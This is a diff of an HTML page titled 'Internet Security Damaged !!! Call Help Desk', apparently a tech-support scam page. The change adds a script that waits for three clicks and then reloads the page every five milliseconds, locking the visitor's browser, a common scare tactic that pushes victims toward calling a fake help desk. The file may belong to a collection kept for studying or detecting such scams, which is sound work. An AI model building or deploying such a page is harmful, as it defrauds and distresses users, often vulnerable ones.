@@ -1,1 +1,30 @@
-<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>Internet Security Damaged !!! Call Help Desk</title>
+
+<script>
+var attempts = 3;
+
+function decreaseAttempts() {
+	attempts--;
+	if (attempts == 0) {
+		timedRefresh(5);
+	}
+}
+
+function timedRefresh(timeoutPeriod) {
+	 setInterval("location.reload(true);",timeoutPeriod);
+}
+
+window.addEventListener("click", decreaseAttempts);
+
+</script>
+</head>
+<body>
+<div>
+
+</div>
+
+</body>
+</html>
